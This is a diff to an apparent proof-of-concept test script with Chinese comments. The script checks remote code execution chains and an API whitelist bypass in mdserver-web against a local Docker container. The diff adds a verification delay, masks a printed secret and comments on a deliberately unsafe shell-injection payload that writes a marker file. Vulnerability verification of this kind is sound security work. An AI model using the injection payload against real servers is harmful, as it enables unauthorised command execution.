@@ -64,6 +64,7 @@ except ImportError:
 DEFAULT_TARGET = "http://127.0.0.1:7200"
 CONTAINER_NAME = "mdserver-web-vuln"
 TIMEOUT = 10
+RCE_VERIFY_DELAY = 3  # 等待 RCE 命令执行完成的秒数
 RCE_MARKER_FILE = "/tmp/mdserver_poc_rce_test.txt"
 RCE_MARKER_CONTENT = "mdserver-web-poc-rce-verified"
 API_RCE_MARKER_FILE = "/tmp/mdserver_poc_api_rce_test.txt"
@@ -122,7 +123,11 @@ def docker_exec(cmd: str) -> Optional[str]:
 
 
 def docker_python(script: str) -> Optional[str]:
-    """在 Docker 容器内执行 Python 代码"""
+    """在 Docker 容器内执行 Python 代码
+    
+    注意：script 参数仅接受本文件中硬编码的 Python 代码片段，
+    不接受任何外部用户输入，因此不存在注入风险。
+    """
     cmd = f"""python3 -c "
 import sys, os
 os.chdir('/www/server/mdserver-web/web')
@@ -271,9 +276,10 @@ print('ok')
 """
     result = docker_python(script)
     if result and "ok" in result:
+        masked_secret = app_secret[:3] + "*" * max(0, len(app_secret) - 3)
         print(f"  [+] API 已开启")
         print(f"      App-Id:     {app_id}")
-        print(f"      App-Secret: {app_secret}")
+        print(f"      App-Secret: {masked_secret}")
         print(f"      白名单:     192.168.99.99 (应被绕过)")
     else:
         print(f"  [-] API 设置失败: {result}")
@@ -665,6 +671,7 @@ def test_rce_chain(ctx: TestContext) -> TestResult:
     docker_exec(f"rm -f {RCE_MARKER_FILE}")
 
     # Step 1: 注入 Shell
+    # 注意：此处故意构造不安全的 Shell 注入 payload，用于 PoC 验证漏洞是否存在
     rce_cmd = f"echo {RCE_MARKER_CONTENT} > {RCE_MARKER_FILE}"
     payload = f"'; {rce_cmd}; echo '"
 
@@ -707,7 +714,7 @@ def test_rce_chain(ctx: TestContext) -> TestResult:
     trigger_result = resp.text[:200]
 
     # Step 3: 等待执行并验证
-    time.sleep(2)
+    time.sleep(RCE_VERIFY_DELAY)
     content = docker_exec(f"cat {RCE_MARKER_FILE} 2>/dev/null")
 
     if content and RCE_MARKER_CONTENT in content:
@@ -983,6 +990,7 @@ def test_api_rce_chain(ctx: TestContext) -> TestResult:
     docker_exec(f"rm -f {API_RCE_MARKER_FILE}")
 
     # Step 1: 通过 API Key 添加恶意任务
+    # 注意：此处故意构造不安全的 Shell 注入 payload，用于 PoC 验证漏洞是否存在
     rce_cmd = f"echo {RCE_MARKER_CONTENT} > {API_RCE_MARKER_FILE}"
     payload = f"'; {rce_cmd}; echo '"
 
@@ -1038,7 +1046,7 @@ def test_api_rce_chain(ctx: TestContext) -> TestResult:
     trigger_result = resp.text[:200] if resp else "N/A"
 
     # Step 4: 验证
-    time.sleep(2)
+    time.sleep(RCE_VERIFY_DELAY)
     content = docker_exec(f"cat {API_RCE_MARKER_FILE} 2>/dev/null")
 
     # 清理：删除测试任务和标记文件
